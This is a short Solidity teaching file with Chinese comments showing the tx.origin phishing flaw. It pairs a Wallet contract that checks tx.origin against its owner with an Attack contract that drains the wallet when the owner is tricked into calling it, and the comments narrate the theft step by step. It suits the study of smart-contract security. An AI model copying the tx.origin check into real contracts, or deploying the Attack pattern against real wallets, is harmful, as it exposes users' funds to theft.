// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/*
Wallet是一个简单的合约，只有所有者才能将以太转移到另一个地址。
Wallet.transfer()使用tx.origin来检查调用者是否为所有者。
让我们看看如何攻击这个合约。
*/

/*
1. Alice部署Wallet并存入10个以太
2. Eve部署Attack并传入Alice的Wallet合约地址
3. Eve欺骗Alice调用Attack.attack()
4. Eve成功从Alice的钱包中窃取了以太

发生了什么？
Alice被欺骗调用Attack.attack()。在Attack.attack()内部，它请求将Alice钱包中的所有资金转移到Eve的地址。
由于Wallet.transfer()中的tx.origin等于Alice的地址，它授权了转移。钱包将所有以太转移到了Eve。
*/

contract Wallet {
    address public owner;

    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Not owner");

        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    address payable public owner;
    Wallet wallet;

    constructor(Wallet _wallet) {
        wallet = Wallet(_wallet);
        owner = payable(msg.sender);
    }

    function attack() public {
        wallet.transfer(owner, address(wallet).balance);
    }
}
